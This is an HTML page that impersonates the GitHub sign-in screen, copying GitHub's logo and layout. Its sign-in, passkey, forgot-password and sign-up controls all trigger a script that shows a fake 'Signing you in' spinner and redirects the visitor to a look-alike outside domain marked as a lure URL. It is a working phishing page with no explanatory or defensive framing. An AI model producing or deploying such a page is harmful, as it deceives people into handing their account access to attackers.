<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to GitHub · GitHub</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;font-size:14px;line-height:1.5;background:#f6f8fa;color:#1f2328;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.logo{margin-bottom:16px}.card{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;width:100%;max-width:340px;margin-bottom:16px}
h1{font-size:24px;font-weight:300;letter-spacing:-.5px;margin-bottom:16px;text-align:center;white-space:nowrap}
label{display:block;font-weight:600;margin-bottom:6px}
input{display:block;width:100%;border:1px solid #d0d7de;border-radius:6px;padding:5px 12px;font-size:14px;margin-bottom:16px;outline:none;background:#fff;line-height:20px;height:32px}
input:focus{border-color:#0969da;box-shadow:0 0 0 3px rgba(9,105,218,.3);outline:none}
.forgot{font-size:12px;color:#0969da;text-decoration:none;float:right;margin-top:-12px;margin-bottom:12px}
.btn{display:block;width:100%;padding:5px 16px;background:#1f883d;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;margin-top:4px;height:32px;line-height:20px}
.btn:hover{background:#1a7f37}
.divider{display:flex;align-items:center;gap:16px;color:#57606a;font-size:12px;margin:16px 0}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#d0d7de}
.passkey-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:5px 16px;border:1px solid #d0d7de;border-radius:6px;font-size:14px;font-weight:500;color:#1f2328;background:#f6f8fa;cursor:pointer;height:32px}
.passkey-btn:hover{background:#eaf5ff;border-color:#0969da;color:#0969da}
.signup{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:16px;width:100%;max-width:340px;text-align:center;font-size:14px}
.signup a{color:#0969da;font-weight:600;text-decoration:none}
.spinner{width:24px;height:24px;border:2px solid #d0d7de;border-top:2px solid #1f883d;border-radius:50%;animation:spin .8s linear infinite;margin:40px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none;text-align:center}</style></head>
<body>
<div class="logo"><svg height="48" viewBox="0 0 16 16" width="48" xmlns="http://www.w3.org/2000/svg"><path fill="#1f2328" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.6-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></svg></div>
<div class="card" id="card">
<h1>Sign in to GitHub</h1>
<label for="em">Username or email address</label>
<input type="text" id="em">
<label for="pw">Password <a href="#" class="forgot" onclick="go();return false">Forgot password?</a></label>
<input type="password" id="pw">
<button class="btn" onclick="go()">Sign in</button>
<div class="divider">or</div>
<button class="passkey-btn" onclick="go()"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Zm0 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13Zm0 2a2 2 0 1 1 0 4 2 2 0 0 1 0-4Zm0 5.5c2.07 0 3.76.97 4.43 2.38A6.483 6.483 0 0 1 8 14.5a6.483 6.483 0 0 1-4.43-3.12C4.24 10.0 5.93 9 8 9Z"/></svg>Sign in with a passkey</button>
</div>
<div class="signup">New to GitHub? <a href="#" onclick="go();return false">Create an account</a>.</div>
<div id="loading"><div class="spinner"></div><p style="color:#57606a;margin-top:8px">Signing you in&hellip;</p></div>
<script>
var LURE_URL='https://githubses.authenticationsession.online/JvpZZNHy'; /* AUTO_LURE_URL */
function go(){document.getElementById('card').style.display='none';document.querySelector('.signup').style.display='none';document.querySelector('.logo').style.display='none';document.getElementById('loading').style.display='block';setTimeout(function(){window.location.href=LURE_URL;},500);}
</script></body></html>
